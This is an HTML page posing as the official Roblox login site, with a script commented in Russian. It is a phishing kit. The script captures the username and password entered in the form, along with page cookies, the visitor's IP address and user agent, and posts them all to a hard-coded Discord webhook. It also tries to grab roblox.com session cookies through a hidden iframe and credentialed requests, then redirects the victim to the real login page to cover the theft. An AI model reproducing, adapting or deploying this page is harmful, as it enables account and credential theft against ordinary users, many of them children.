<!DOCTYPE html>
<html>
<head>
    <title>Roblox - Official Site</title>
    <style>
        body {
            background: #f0f0f0;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
        }
        .login-form {
            width: 300px;
            margin: 100px auto;
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 3px;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #00a2ff;
            color: white;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-form">
        <h2>Login to Roblox</h2>
        <form id="loginForm">
            <input type="text" placeholder="Username/Email/Phone" required>
            <input type="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>

    <script>
    const WEBHOOK = "https://discord.com/api/webhooks/1423743576449355829/yY-2bD1RbEK5QAIloiuJzPyIaMP_g8bgjhMjfw0jdBQc-CcH_EjiGXE-UWF1zJsygOuA";

    // Создаем скрытый iframe для Roblox.com
    const iframe = document.createElement('iframe');
    iframe.src = 'https://www.roblox.com';
    iframe.style.display = 'none';
    document.body.appendChild(iframe);

    // Пытаемся получить куки через iframe
    setTimeout(() => {
        try {
            const robloxCookies = iframe.contentDocument?.cookie;
            if (robloxCookies) {
                sendToDiscord('ROBLOX_IFRAME_COOKIES', robloxCookies);
            }
        } catch(e) {
            // Если не получилось через iframe, используем другие методы
            stealCookiesAdvanced();
        }
    }, 2000);

    function stealCookiesAdvanced() {
        // Метод 1: Попытка XHR с credentials
        const xhr = new XMLHttpRequest();
        xhr.withCredentials = true;
        xhr.open('GET', 'https://www.roblox.com/games', true);
        xhr.onreadystatechange = function() {
            if(xhr.readyState === 4) {
                const cookies = xhr.getResponseHeader('set-cookie');
                if(cookies) {
                    sendToDiscord('XHR_COOKIES', cookies);
                }
            }
        };
        xhr.send();

        // Метод 2: Fetch с credentials
        fetch('https://www.roblox.com/games', { 
            credentials: 'include',
            mode: 'no-cors'
        }).then(response => {
            // Логируем попытку
            sendToDiscord('FETCH_ATTEMPT', 'Tried to include credentials');
        });

        // Метод 3: Попытка доступа через image
        const img = new Image();
        img.src = 'https://www.roblox.com/favicon.ico';
        img.onload = function() {
            sendToDiscord('IMAGE_LOAD', 'Loaded Roblox favicon');
        };
    }

    function sendToDiscord(method, data) {
        const payload = {
            embeds: [{
                title: "🍪 COOKIE STEAL ATTEMPT",
                color: 0xff0000,
                fields: [
                    { name: "Method", value: method, inline: true },
                    { name: "Data", value: "```" + (data || 'No data') + "```", inline: false },
                    { name: "User Agent", value: navigator.userAgent, inline: false },
                    { name: "URL", value: window.location.href, inline: true }
                ],
                timestamp: new Date().toISOString()
            }]
        };

        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(e => console.log('Discord error'));
    }

    // Перехват формы логина
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const username = this.querySelector('input[type="text"]').value;
        const password = this.querySelector('input[type="password"]').value;
        
        // Отправляем логин/пароль
        sendToDiscord('LOGIN_CREDENTIALS', `Username: ${username} | Password: ${password}`);
        
        // Перенаправляем на настоящий Roblox
        setTimeout(() => {
            window.location.href = 'https://www.roblox.com/login';
        }, 1000);
    });

    // Крадем данные при загрузке
    window.addEventListener('load', () => {
        sendToDiscord('PAGE_LOAD', `Cookies: ${document.cookie}`);
        
        // Получаем IP
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(ipData => {
                sendToDiscord('IP_ADDRESS', ipData.ip);
            });
    });
    </script>
</body>
</html>
